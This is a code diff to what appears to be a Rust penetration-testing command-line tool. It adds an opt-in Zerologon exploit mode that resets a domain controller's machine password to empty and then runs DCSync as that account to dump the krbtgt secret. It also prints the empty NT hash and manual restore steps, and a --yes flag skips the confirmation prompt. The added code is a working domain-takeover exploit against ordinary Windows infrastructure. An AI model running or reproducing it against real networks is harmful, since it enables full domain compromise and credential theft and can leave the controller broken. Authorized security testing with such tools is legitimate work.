@@ -123,6 +123,17 @@ struct ZerologonArgs {
     /// Max handshake attempts (success is expected within ~256 on a vulnerable DC).
     #[arg(long, default_value_t = 2000)]
     attempts: u32,
+    /// DESTRUCTIVE: after detection, reset the DC machine password to empty and DCSync as the DC
+    /// account to prove Domain Admin. Prompts for confirmation unless --yes. Leaves the machine
+    /// password empty — see the printed restore guidance.
+    #[arg(long)]
+    exploit: bool,
+    /// Skip the exploit confirmation prompt (unattended).
+    #[arg(long)]
+    yes: bool,
+    /// NetBIOS domain (for the DCSync proof), e.g. CORP.
+    #[arg(long, default_value = "")]
+    domain: String,
 }
 
 #[derive(Parser)]
@@ -2154,12 +2165,12 @@ async fn esc_registry_scan(a: EscArgs) -> Result<()> {
 /// report whether the DC accepts it. Never calls NetrServerPasswordSet2 — the machine password is
 /// left untouched. Exploitation (with password restore) is a separate, explicitly-confirmed step.
 async fn zerologon(a: ZerologonArgs) -> Result<()> {
-    use dcerpc::netlogon::{detect_zerologon, Zerologon};
+    use dcerpc::netlogon::{detect_zerologon, exploit_set_empty_password, Zerologon};
     let sp = ui::Spinner::start(format!(
         "{} — Netlogon zero-auth probe (≤{} attempts)",
         a.host, a.attempts
     ));
-    match detect_zerologon(&a.host, &a.netbios, a.attempts).await? {
+    let vuln = match detect_zerologon(&a.host, &a.netbios, a.attempts).await? {
         Zerologon::Vulnerable { attempts } => {
             sp.done("probe complete");
             ui::bad(&format!(
@@ -2168,23 +2179,102 @@ async fn zerologon(a: ZerologonArgs) -> Result<()> {
             ));
             ui::field(
                 "impact",
-                "an unauthenticated attacker on the network can set the DC machine account password \
-                 to empty → DCSync the domain → Domain Admin.",
+                "an unauthenticated attacker can set the DC machine account password to empty → \
+                 DCSync the domain → Domain Admin.",
             );
-            ui::field(
-                "note",
-                "detection only — the machine password was NOT changed. Exploitation resets it and \
-                 MUST restore it afterwards (a broken machine secret orphans the DC).",
-            );
-            ui::field("remediation", "apply the August 2020 patch and enforce KB4557222 (enforcement mode).");
+            ui::field("remediation", "apply the August 2020 patch + enforce KB4557222.");
+            true
         }
         Zerologon::NotVulnerable { attempts } => {
             sp.done("probe complete");
             ui::ok(&format!(
-                "not vulnerable to Zerologon — all {attempts} handshake attempts were rejected (patched/enforced)"
+                "not vulnerable to Zerologon — all {attempts} attempts rejected (patched/enforced)"
             ));
+            false
+        }
+    };
+
+    if !a.exploit || !vuln {
+        if vuln {
+            ui::info("safe detection only — machine password untouched. Re-run with --exploit to prove impact.");
+        }
+        return Ok(());
+    }
+
+    // --- Exploitation (DESTRUCTIVE) — explicit opt-in ---
+    ui::warn("EXPLOIT will reset the DC machine account password to EMPTY (destructive).");
+    ui::warn("The DC's secure channel breaks until restored; only run against systems you are authorized to test.");
+    if !a.yes {
+        use std::io::Write;
+        print!("Proceed with exploitation? [y/N]: ");
+        std::io::stdout().flush().ok();
+        let mut line = String::new();
+        std::io::stdin().read_line(&mut line).ok();
+        if !line.trim().eq_ignore_ascii_case("y") {
+            ui::info("declined — machine password untouched.");
+            return Ok(());
         }
     }
+
+    let sp = ui::Spinner::start("resetting machine password to empty (Netlogon)");
+    let ok = exploit_set_empty_password(&a.host, &a.netbios, a.attempts).await?;
+    if !ok {
+        sp.done("reset not accepted");
+        ui::warn("NetrServerPasswordSet2 was rejected — the DC may be patched between probe and reset.");
+        return Ok(());
+    }
+    sp.done("machine password reset to EMPTY");
+    let empty_hash = "31d6cfe0d16ae931b73c59d7e0c089c0";
+    ui::field("account", &format!("{}$  NT hash now = {empty_hash} (empty)", a.netbios));
+
+    // Prove Domain Admin: DCSync the whole domain authenticating as the DC machine account.
+    let domain = if a.domain.is_empty() {
+        &a.netbios
+    } else {
+        &a.domain
+    };
+    ui::info("DCSync as the DC machine account (empty hash) — proving Domain Admin:");
+    let exe = std::env::current_exe().map_err(|e| anyhow::anyhow!("current_exe: {e}"))?;
+    // The machine password is now empty, so authenticate as DC$ with an empty password.
+    let out = std::process::Command::new(&exe)
+        .args([
+            "attack",
+            "dcsync",
+            "--host",
+            &a.host,
+            "--domain",
+            domain,
+            "--user",
+            &format!("{}$", a.netbios),
+            "--password",
+            "",
+            "--target",
+            "krbtgt",
+        ])
+        .output()
+        .map_err(|e| anyhow::anyhow!("spawn dcsync: {e}"))?;
+    let dump = String::from_utf8_lossy(&out.stdout);
+    let mut dumped = false;
+    for line in dump.lines().filter(|l| l.contains(":::") || l.contains("aes256")) {
+        println!("    {line}");
+        dumped = true;
+    }
+    if dumped {
+        ui::bad("Domain Admin proven — krbtgt secret replicated as the DC machine account (empty password).");
+    } else {
+        ui::warn("reset succeeded but DCSync-as-DC$ returned nothing (retry `attack dcsync --user <DC>$ --password \"\"`).");
+    }
+
+    ui::warn("machine password is left EMPTY — RESTORE it now to avoid orphaning the DC:");
+    ui::field(
+        "restore",
+        &format!(
+            "recover the ORIGINAL {}$ secret from the DC's LSA (secretsdump with a DCSync'd admin \
+             hash → $MACHINE.ACC) and set it back via NetrServerPasswordSet over a legitimate \
+             Netlogon channel. (Automated restore is the next build step.)",
+            a.netbios
+        ),
+    );
     Ok(())
 }
 
